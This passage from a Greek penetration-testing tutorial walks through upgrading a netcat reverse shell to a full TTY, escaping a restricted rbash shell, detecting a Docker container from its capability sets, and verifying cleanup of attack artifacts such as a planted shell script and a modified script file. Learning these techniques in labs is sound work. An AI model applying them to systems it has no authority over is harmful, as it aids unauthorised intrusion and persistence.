**Διαβάστε την έξοδο της κωδικοποίησης:** `%20` = κενό, `%27` = `'`, `%3E` = `>`, `%26` = `&`,
`%2F` = `/`. **Κάθε ένας από αυτούς τους χαρακτήρες είναι νόημα σε ένα URL** — το κενό
διαχωρίζει όρους, το `'` κλείνει παράθεση, το `&` διαχωρίζει παραμέτρους, το `>` είναι
δεσμευμένο, το `/` διαχωρίζει διαδρομές.

### 9.3 Αναβάθμιση TTY — τι βλέπετε σε κάθε βήμα

```bash
# ΣΤΟ ΣΤΟΧΟ
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```text
www-data@target:/var/www/html$
```
**Το prompt φαίνεται ίδιο — αλλά δεν είναι.** Τώρα δοκιμάστε `sudo -l`:

```text
www-data@target:/var/www/html$ sudo -l
[sudo] password for www-data:
```

**Ρωτάει κωδικό!** Πριν από το `pty.spawn`, θα δίνατε `sudo: no tty present and no askpass
program specified`. **Αυτή είναι η απόδειξη ότι το TTY υπάρχει.**

```bash
# Ctrl+Z
[1]+  Stopped                 nc -lvnp 4444
# ΣΤΟΝ KALI
stty raw -echo; fg
# (Enter ×2 — δεν βλέπετε τίποτα, είναι φυσιολογικό)
# ΣΤΟ ΣΤΟΧΟ
export TERM=xterm
stty rows 40 cols 160
clear
```

**Το `[1]+ Stopped`** είναι η επιβεβαίωση ότι το `Ctrl+Z` δούλεψε. Το **`fg`** δεν τυπώνει
τίποτα — **απλώς επιστρέφετε στον ακροατή**. Γι' αυτό χρειάζεστε **δύο Enter**: για να
εμφανιστεί ξανά το prompt του στόχου.

**Δοκιμή ότι όλα δουλεύουν:**
- Πατήστε **βελάκι πάνω** → πρέπει να δείτε την προηγούμενη εντολή (όχι `^[[A`)
- Πατήστε **Tab** → πρέπει να συμπληρώσει όνομα αρχείου
- Τρέξτε **`top`** → πρέπει να εμφανιστεί σωστά, όχι αναδιπλωμένο
- Πατήστε **`Ctrl+C`** μέσα στο `top` → πρέπει να βγείτε από το top, **χωρίς να χάσετε το shell**

### 9.4 Διάγνωση rbash

```bash
cd /tmp
/bin/ls
whoami
echo $0; echo $SHELL; set -o | grep restricted; echo $PATH
```

```text
-rbash: cd: restricted
-rbash: /bin/ls: restricted
-rbash: whoami: command not found
```
```text
-rbash
/bin/rbash
restricted        on
/home/tom/usr/bin
```

**Τρία διαφορετικά μηνύματα, τρεις διαφορετικοί περιορισμοί:**
- **`cd: restricted`** — η `cd` είναι **ρητά μπλοκαρισμένη** εντολή.
- **`/bin/ls: restricted`** — μπλοκαρίστηκε **επειδή περιέχει `/`**. Η `ls` επιτρέπεται, το
  `/bin/ls` όχι.
- **`whoami: command not found`** — **δεν υπάρχει στον καρφιτσωμένο `PATH`**. Διαφορετικός
  μηχανισμός, ίδιο αποτέλεσμα.

**Αυτή η διάκριση έχει σημασία:** αν όλα έλεγαν `restricted`, θα ψάχνατε για διαφυγή μέσω
εντολής. Εφόσον το τρίτο λέει `command not found`, **το πρόβλημα είναι το PATH** — και μετά τη
διαφυγή πρέπει να το **επιδιορθώσετε**.

```bash
bash --noprofile --norc
```

**Δοκιμάστε το ΠΡΩΤΟ.** Αν ο περιορισμός επιβάλλεται από το `~/.bashrc` (που κάνει `set -o
restricted`) και όχι από το binary `rbash`, τότε **το να παραλείψετε τα αρχεία εκκίνησης
νικά τον περιορισμό χωρίς καμία τεχνική.** Είναι δωρεάν, διαρκεί ένα δευτερόλεπτο, και
λειτουργεί σε πολλά μηχανήματα.

### 9.5 Ανίχνευση container — η πλήρης σειρά

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
grep -i cap /proc/self/status
hostname
cat /proc/1/comm
```

```text
-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
1:memory:/docker/0d8f1c2b3a4e2f7b8c9d0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
0d8f1c2b3a4e
sh
```

**Ανάγνωση των τεσσάρων γραμμών Cap:**

| Γραμμή | Τι είναι |
| --- | --- |
| **`CapInh`** (Inheritable) | Τι κληρονομούν οι **παιδικές** διεργασίες |
| **`CapPrm`** (Permitted) | Το **ανώτατο όριο** — τι μπορείτε να ενεργοποιήσετε |
| **`CapEff`** (Effective) | **Τι ισχύει ΤΩΡΑ** — αυτό κοιτάζει ο πυρήνας |
| **`CapBnd`** (Bounding) | Το **όριο** για όλη τη διεργασία και τους απογόνους της |

**`00000000a80425fb` είναι το προεπιλεγμένο σύνολο της Docker.** Το `0000003fffffffff` είναι
**όλα** τα 41 capabilities — δηλαδή **μη περιορισμένο root** (ή `--privileged` container).
**`CapPrm: 0000000000000000`** σε ένα container σημαίνει ότι δεν έχετε κανένα προνόμιο για να
ενεργοποιήσετε — άρα η διαφυγή πρέπει να έρθει από **ομάδα** (docker/lxd), όχι από capability.

**`cat /proc/1/comm` = `sh`** — το PID 1 είναι ένα κέλυφος, όχι `systemd`. **Σε πραγματικό
ξενιστή, το PID 1 είναι πάντα `systemd` ή `init`.** Αυτό από μόνο του είναι σχεδόν αδιάσειστη
απόδειξη.

### 9.6 Καθαρισμός με επαλήθευση

```bash
# 1. Τι δημιουργήσατε;
find / -newer /etc/hostname -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

```text
/tmp/rb
/tmp/shell.sh
/home/cengover/backup.tar
/home/cengover/evil/whoami
/opt/md5check.py
```

**`-newer /etc/hostname`** χρησιμοποιεί το αρχείο που δημιουργήθηκε **κατά την εγκατάσταση**
ως σημείο αναφοράς — άρα βρίσκει **ό,τι είναι νεότερο από την εκκίνηση του συστήματος**. Είναι
ο ταχύτερος τρόπος να δείτε τα δικά σας ίχνη. **Το `/opt/md5check.py` στη λίστα επιβεβαιώνει
ότι το τροποποιήσατε — και πρέπει να το επαναφέρετε.**

```bash
# 2. Διαγράψτε
rm -f /tmp/rb /tmp/shell.sh /home/cengover/backup.tar
rm -rf /home/cengover/evil
cp /tmp/md5check.py.bak /opt/md5check.py

# 3. ΕΠΑΛΗΘΕΥΣΤΕ
ls -la /tmp/rb /tmp/shell.sh 2>&1
diff /opt/md5check.py /tmp/md5check.py.bak
md5sum /opt/md5check.py
```

```text
ls: cannot access '/tmp/rb': No such file or directory
ls: cannot access '/tmp/shell.sh': No such file or directory
```

**Καμία έξοδος από το `diff` = τα αρχεία είναι πανομοιότυπα = η επαναφορά πέτυχε.** Αν το
`diff` τυπώσει έστω μία γραμμή, **η επαναφορά απέτυχε** — και το μηχάνημα είναι σε
ασυνεπή κατάσταση.

```bash
# 4. Σκοτώστε τις διεργασίες σας
ps aux | grep -E 'pspy|linpeas|nc -lvnp' | grep -v grep
kill $(pgrep -f pspy64) 2>/dev/null
ss -tulnp | grep -vE '127.0.0.1|::1'
```

**Το `grep -v grep`** αφαιρεί την ίδια την εντολή αναζήτησης από τα αποτελέσματα — χωρίς αυτό,
βλέπετε πάντα τουλάχιστον μία «ψεύτικη» διεργασία. Το `pgrep -f` ψάχνει **ολόκληρη τη γραμμή
εντολών** (όχι μόνο το όνομα), γι' αυτό βρίσκει το `pspy64` ανεξάρτητα από το πώς κλήθηκε.

> ### 📖 Ο κανόνας του καθαρισμού
>
> **Κάθε αρχείο που δημιουργήσατε, κάθε διεργασία που ξεκινήσατε, κάθε λογαριασμός που
> προσθέσατε, και κάθε τροποποίηση που κάνατε πρέπει να αφαιρεθεί — και να επαληθευτεί ότι
> αφαιρέθηκε.** Στην αναφορά σας γράψτε ρητά: «δημιουργήθηκαν τα X, Y, Z· αφαιρέθηκαν όλα·
> επαληθεύτηκε με `find -newer`». Αυτό είναι που ξεχωρίζει έναν επαγγελματία από έναν
> τουρίστα.
